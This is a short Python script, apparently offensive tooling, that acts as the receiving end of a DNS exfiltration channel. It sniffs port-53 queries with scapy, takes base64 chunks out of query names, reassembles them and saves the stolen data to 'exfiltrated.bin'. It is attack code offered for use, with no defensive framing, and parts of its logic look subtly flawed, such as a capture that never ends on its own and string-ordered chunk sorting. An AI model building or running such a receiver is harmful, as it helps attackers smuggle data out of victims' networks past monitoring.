#!/usr/bin/env python3

import socket
import base64
from scapy.all import sniff, DNS, DNSQR

collected = {}

def process_packet(packet):
    if packet.haslayer(DNSQR):
        query = packet[DNSQR].qname.decode()
        parts = query.split('.')
        
        if len(parts) >= 3:
            seq = parts[0]
            data = parts[1]
            collected[seq] = data
            print(f"[+] Received chunk {seq}: {data[:20]}...")

print("[*] Starting DNS exfil receiver on port 53...")
print("[*] Listening for queries...")

sniff(filter="udp port 53", prn=process_packet, store=0)

# Reconstruct
sorted_data = ''.join([collected[k] for k in sorted(collected.keys())])
decoded = base64.b64decode(sorted_data)

with open('exfiltrated.bin', 'wb') as f:
    f.write(decoded)

print(f"[+] Saved to exfiltrated.bin")
